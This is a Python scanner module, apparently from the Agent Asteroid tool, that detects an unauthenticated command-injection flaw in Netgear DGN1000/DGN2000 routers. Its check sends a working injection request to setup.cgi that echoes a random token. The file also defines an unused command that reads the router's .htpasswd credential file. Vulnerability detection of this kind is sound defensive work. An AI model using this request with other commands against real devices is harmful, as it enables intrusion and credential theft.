"""Agent Asteroid implementation for CVE-2024-12847"""

import datetime
import logging
import random
import string

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Netgear DGN1000/DGN2000 Unauthenticated RCE"
VULNERABILITY_REFERENCE = "CVE-2024-12847"
VULNERABILITY_DESCRIPTION = (
    "Netgear DGN1000 and DGN2000 routers contain an unauthenticated remote code execution "
    "vulnerability in the setup.cgi script. The syscmd function allows execution of "
    "arbitrary commands."
)
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)

COMMAND = "cat+/www/.htpasswd"
ENDPOINT = "/setup.cgi"


@exploits_registry.register
class NetgearDGNCommandInjectionExploit(webexploit.WebExploit):
    """
    CVE-2024-12847: Netgear DGN1000/DGN2000 Unauthenticated RCE
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = self.session.get(
                target.origin + ENDPOINT, timeout=DEFAULT_TIMEOUT.seconds
            )
        except requests_exceptions.RequestException:
            return False
        if resp.status_code == 200:
            return True
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect command injection vulnerability on a target."""
        vulnerabilities: list[definitions.Vulnerability] = []
        # Generate a fresh random token each time (12 chars [a–zA–Z0–9])
        token = "".join(random.choices(string.ascii_letters + string.digits, k=12))
        safe_cmd = f"echo+{token}"

        try:
            resp = self.session.get(
                f"{target.origin}{ENDPOINT}",
                params={
                    "next_file": "netgear.cfg",
                    "todo": "syscmd",
                    "cmd": safe_cmd,
                    "curpath": "/",
                    "currentsetting.htm": "1",
                },
                timeout=DEFAULT_TIMEOUT.seconds,
            )

            if resp.status_code == 200 and token in resp.text:
                vulnerabilities.append(self.create_vulnerability(target))

        except requests_exceptions.RequestException as e:
            logging.error("Command injection detection failed: %s", e)

        return vulnerabilities
